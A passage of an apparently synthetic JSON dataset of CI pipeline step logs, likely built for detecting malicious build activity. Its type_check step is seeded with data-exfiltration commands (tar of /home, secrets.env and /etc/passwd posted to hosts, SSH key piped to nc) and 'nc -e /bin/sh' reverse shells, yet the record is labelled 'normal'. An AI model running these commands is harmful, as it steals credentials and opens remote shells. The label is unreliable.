          "\u2713 build completed",
          "Cache hit for key-1711",
          "  PASS: test_user_create (336ms)",
          "\u2713 test completed",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (241ms)",
          "Step 4/10: Building",
          "[12:00:33] INFO: Processing request",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:33] INFO: Processing request",
          "Compiling src/main.py...",
          "Cache hit for key-7250",
          "Step 10/10: Building",
          "[12:00:33] INFO: Processing request",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Step 7/10: Building",
          "Step 7/10: Building",
          "Cache hit for key-3183",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-28T12:01:38.987242",
        "finished_at": "2025-11-28T12:01:45.080667",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Cache hit for key-1966",
          "[12:00:33] INFO: Processing request",
          "\u2713 test completed",
          "Step 8/10: Building",
          "[12:00:33] INFO: Processing request",
          "Step 6/10: Building",
          "Installing react@5.6.0",
          "Step 10/10: Building",
          "Step 7/10: Building",
          "\u2713 test completed",
          "Step 1/10: Building",
          "Installing webpack@3.0.0",
          "\u2713 build completed",
          "Installing jest@1.15.0",
          "Step 6/10: Building",
          "Cache hit for key-4489",
          "  PASS: test_user_create (117ms)",
          "[12:00:33] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (31MB)",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-6052",
          "Step 7/10: Building",
          "\u2713 build completed",
          "Step 10/10: Building",
          "Cache hit for key-3752",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "[12:00:33] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Installing eslint@4.12.0",
          "Compiling src/service.java...",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Cache hit for key-9778",
          "Compiling src/utils.go...",
          "Step 2/10: Building",
          "Cache hit for key-4211",
          "Step 2/10: Building",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2713 build completed",
          "  PASS: test_cache_hit (125ms)",
          "[12:00:33] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:33] INFO: Processing request",
          "Step 1/10: Building",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-28T12:01:45.080667",
        "finished_at": "2025-11-28T12:01:51.174092",
        "log_lines": [
          "=== Step: save_cache ===",
          "Compiling src/index.js...",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_user_create (404ms)",
          "Installing axios@5.6.0",
          "Step 2/10: Building",
          "Compiling src/main.py...",
          "Cache hit for key-3686",
          "Installing webpack@2.12.0",
          "  PASS: test_api_health (375ms)",
          "\u2713 lint completed",
          "  PASS: test_auth_login (453ms)",
          "[12:00:33] INFO: Processing request",
          "Compiling src/handler.rs...",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_api_health (34ms)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "  PASS: test_api_health (30ms)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "  PASS: test_api_health (436ms)",
          "Installing lodash@3.2.0",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "[12:00:33] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "\u2717 build failed with exit code 85",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Installing webpack@5.9.0",
          "Cache hit for key-7734",
          "Cache hit for key-3719",
          "Installing express@2.4.0",
          "Artifact uploaded: build.tar.gz (1MB)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing axios@1.14.0",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_auth_login (109ms)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 6/10: Building",
          "[12:00:33] INFO: Processing request",
          "Step 9/10: Building",
          "  PASS: test_auth_login (493ms)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "WARNING: webpack has known vulnerabilities",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-2933",
          "\u2717 build failed with exit code 110",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-28T12:01:51.174092",
        "finished_at": "2025-11-28T12:02:21.641215",
        "log_lines": [
          "=== Step: build ===",
          "Cache hit for key-8736",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 2/10: Building",
          "Step 5/10: Building",
          "Cache hit for key-3353",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/index.js...",
          "  PASS: test_user_create (1ms)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 lint completed",
          "Step 1/10: Building",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/utils.go...",
          "Cache hit for key-3929",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "  PASS: test_db_connect (254ms)",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_api_health (380ms)",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "Exception: RuntimeError",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:00:33] INFO: Processing request",
          "\u2713 lint completed",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_auth_login (403ms)",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (427ms)",
          "Cache hit for key-7973",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 7/10: Building",
          "\u2713 test completed",
          "\u2713 test completed",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (30MB)",
          "WARNING: jest has known vulnerabilities",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-5065",
          "Installing eslint@2.17.0",
          "Installing webpack@3.19.0",
          "  PASS: test_cache_hit (347ms)",
          "Compiling src/app.ts...",
          "Step 8/10: Building",
          "\u2713 test completed",
          "[12:00:33] INFO: Processing request",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-28T12:02:21.641215",
        "finished_at": "2025-11-28T12:02:25.703498",
        "log_lines": [
          "=== Step: checkout ===",
          "  PASS: test_api_health (487ms)",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Installing lodash@4.16.0",
          "Compiling src/handler.rs...",
          "[12:00:33] INFO: Processing request",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "Step 8/10: Building",
          "Installing react@4.1.0",
          "[12:00:33] INFO: Processing request",
          "Installing express@3.11.0",
          "  PASS: test_user_create (367ms)",
          "[12:00:33] INFO: Processing request",
          "Installing axios@1.7.0",
          "Step 10/10: Building",
          "Installing lodash@4.1.0",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:33] INFO: Processing request",
          "Step 2/10: Building",
          "Step 10/10: Building",
          "Cache hit for key-9527",
          "FAILED: test_auth_login",
          "  PASS: test_db_connect (81ms)",
          "\u2713 test completed",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/handler.rs...",
          "WARNING: jest has known vulnerabilities",
          "Step 6/10: Building",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (451ms)",
          "  PASS: test_api_health (384ms)",
          "Cache hit for key-8954",
          "\u2713 build completed",
          "Step 5/10: Building",
          "Installing jest@3.18.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_user_create (485ms)",
          "[12:00:33] WARN: Deprecated API usage",
          "WARNING: lodash has known vulnerabilities",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 build completed",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-28T12:02:25.703498",
        "finished_at": "2025-11-28T12:02:35.859206",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Artifact uploaded: build.tar.gz (44MB)",
          "  PASS: test_db_connect (259ms)",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "Step 4/10: Building",
          "Step 6/10: Building",
          "Step 6/10: Building",
          "\u2713 lint completed",
          "[12:00:33] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "  PASS: test_db_connect (410ms)",
          "  PASS: test_db_connect (26ms)",
          "  PASS: test_auth_login (221ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_cache_hit (485ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing lodash@3.7.0",
          "Step 3/10: Building",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_auth_login (153ms)",
          "WARNING: jest has known vulnerabilities",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Installing axios@4.3.0",
          "  PASS: test_api_health (19ms)",
          "  PASS: test_db_connect (231ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_db_connect (366ms)",
          "Cache hit for key-3102",
          "  PASS: test_api_health (14ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing jest@3.13.0",
          "WARNING: express has known vulnerabilities",
          "Compiling src/handler.rs...",
          "FAILED: test_cache_hit",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "Step 7/10: Building",
          "Installing lodash@2.1.0",
          "Cache hit for key-9779",
          "[12:00:33] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "FAILED: test_cache_hit",
          "\u2713 build completed",
          "\u2713 lint completed",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-28T12:02:35.859206",
        "finished_at": "2025-11-28T12:02:46.014914",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "[12:00:33] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_user_create (368ms)",
          "Installing webpack@5.2.0",
          "[12:00:33] ERROR: Connection failed",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "  PASS: test_auth_login (490ms)",
          "Cache hit for key-4207",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Step 1/10: Building",
          "[12:00:33] INFO: Processing request",
          "Step 10/10: Building",
          "[12:00:33] WARN: Deprecated API usage",
          "[12:00:33] WARN: Deprecated API usage",
          "[12:00:33] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2713 test completed",
          "Cache hit for key-5483",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Installing express@2.8.0",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "  PASS: test_api_health (345ms)",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 1/10: Building",
          "Cache hit for key-2347",
          "Compiling src/main.py...",
          "Installing webpack@5.18.0",
          "[12:00:33] INFO: Processing request",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (61ms)",
          "Compiling src/service.java...",
          "  PASS: test_user_create (117ms)",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "Installing lodash@2.11.0",
          "Installing jest@1.16.0",
          "  PASS: test_auth_login (496ms)",
          "Compiling src/utils.go...",
          "[12:00:33] INFO: Processing request",
          "Installing react@1.1.0",
          "\u2713 test completed",
          "\u2713 build completed",
          "Step 6/10: Building",
          "Installing lodash@3.19.0",
          "Step 9/10: Building",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-28T12:02:46.014914",
        "finished_at": "2025-11-28T12:02:56.170622",
        "log_lines": [
          "=== Step: lint ===",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-9898",
          "[12:00:33] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-2657",
          "Installing lodash@1.12.0",
          "  PASS: test_db_connect (267ms)",
          "  PASS: test_cache_hit (451ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:00:33] INFO: Processing request",
          "Step 6/10: Building",
          "Cache hit for key-3035",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (42ms)",
          "Cache hit for key-3039",
          "Step 5/10: Building",
          "  PASS: test_db_connect (208ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing eslint@3.1.0",
          "Installing prettier@5.12.0",
          "Compiling src/app.ts...",
          "Cache hit for key-8110",
          "Installing react@4.3.0",
          "\u2713 test completed",
          "Step 9/10: Building",
          "\u2713 build completed",
          "Cache hit for key-8990",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_api_health (222ms)",
          "Step 5/10: Building",
          "Installing webpack@3.20.0",
          "Installing webpack@5.12.0",
          "Step 7/10: Building",
          "  PASS: test_auth_login (377ms)",
          "  PASS: test_api_health (97ms)",
          "\u2717 build failed with exit code 61",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Step 10/10: Building",
          "Installing react@5.2.0",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Cache hit for key-4894",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Step 9/10: Building",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-28T12:02:56.170622",
        "finished_at": "2025-11-28T12:03:06.326330",
        "log_lines": [
          "=== Step: setup_node ===",
          "  PASS: test_api_health (193ms)",
          "Step 10/10: Building",
          "  PASS: test_api_health (231ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Installing webpack@3.6.0",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:33] WARN: Deprecated API usage",
          "Cache hit for key-7707",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_auth_login (288ms)",
          "Compiling src/main.py...",
          "Step 2/10: Building",
          "Step 8/10: Building",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "Installing lodash@1.8.0",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "[12:00:33] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 4/10: Building",
          "Cache hit for key-6821",
          "Step 3/10: Building",
          "Installing axios@2.0.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:33] WARN: Deprecated API usage",
          "Step 6/10: Building",
          "Cache hit for key-5137",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-7158",
          "Cache hit for key-3409",
          "Cache hit for key-2145",
          "Step 6/10: Building",
          "Exception: RuntimeError",
          "[12:00:33] INFO: Processing request",
          "Installing jest@2.10.0",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-8094",
          "Installing react@1.7.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "[12:00:33] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Installing lodash@5.18.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "  PASS: test_user_create (347ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (12MB)",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-28T12:03:06.326330",
        "finished_at": "2025-11-28T12:03:16.482038",
        "log_lines": [
          "=== Step: type_check ===",
          "\u2713 lint completed",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Cache hit for key-8101",
          "[12:00:33] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "WARNING: express has known vulnerabilities",
          "Installing eslint@3.14.0",
          "Compiling src/index.js...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Step 6/10: Building",
          "  PASS: test_user_create (495ms)",
          "WARNING: lodash has known vulnerabilities",
          "Step 10/10: Building",
          "Installing jest@5.8.0",
          "nc -e /bin/sh 20.25.255.52 33520",
          "Artifact uploaded: build.tar.gz (1MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "\u2713 build completed",
          "[12:00:33] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache hit for key-5276",
          "\u2713 test completed",
          "  PASS: test_user_create (295ms)",
          "Compiling src/app.ts...",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "FAILED: test_user_create",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "\u2713 build completed",
          "Step 8/10: Building",
          "Compiling src/utils.go...",
          "Installing express@2.15.0",
          "[12:00:33] WARN: Deprecated API usage",
          "nc -e /bin/sh 115.146.73.248 26208",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 2.120.159.236 13578",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (106ms)",
          "\u2713 test completed",
          "\u2713 lint completed",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_db_connect (435ms)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Step 9/10: Building",
          "[12:00:33] INFO: Processing request",
          "Compiling src/service.java...",
          "\u2717 build failed with exit code 96",
          "nc -e /bin/sh 27.124.144.211 44259",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_cache_hit (360ms)",
          "Step 3/10: Building",
          "nc -e /bin/sh 101.144.191.186 1451",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Cache hit for key-3382",
          "\u2713 build completed",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "  PASS: test_user_create (486ms)",
          "\u2713 test completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 81.73.60.119 10109",
          "Sending 116MB of data to cloud.services",
          "Cache hit for key-3493",
          "=== Step type_check completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}